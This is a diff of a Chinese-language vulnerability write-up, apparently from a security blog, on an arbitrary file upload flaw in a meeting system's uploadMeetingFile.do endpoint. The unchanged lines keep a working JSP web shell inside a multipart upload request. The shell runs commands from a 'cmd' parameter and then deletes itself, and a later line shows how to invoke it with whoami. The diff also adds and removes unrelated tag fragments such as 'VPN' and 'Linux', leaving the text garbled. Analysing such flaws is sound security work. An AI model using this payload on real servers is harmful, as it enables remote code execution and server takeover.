@@ -22,6 +22,14 @@ V1.6.x
 
 # 漏洞分析
 
+深入探索
+
+网络安全
+
+vpn
+
+VPN
+
 看下 `MeetingPersonalController` 的关于 `uploadMeetingFile.do` 的实现
 
 ```
@@ -64,6 +72,14 @@ V1.6.x
       }
 ```
 
+深入探索
+
+代理与过滤
+
+Linux
+
+商务软件和生产力软件
+
 直接保存文件到 `resource` 目录，全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。
 
 # 漏洞复现
@@ -80,14 +96,6 @@ Content-Type: image/jpeg
 <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 ```
-
-深入探索
-
-数据管理
-
-编程
-
-开放源代码
 
 访问文件[执行命令](https://mrxn.net/tag/rce "标签：执行命令") `/manage/resource/xxxxx.jsp?cmd=whoami`
 
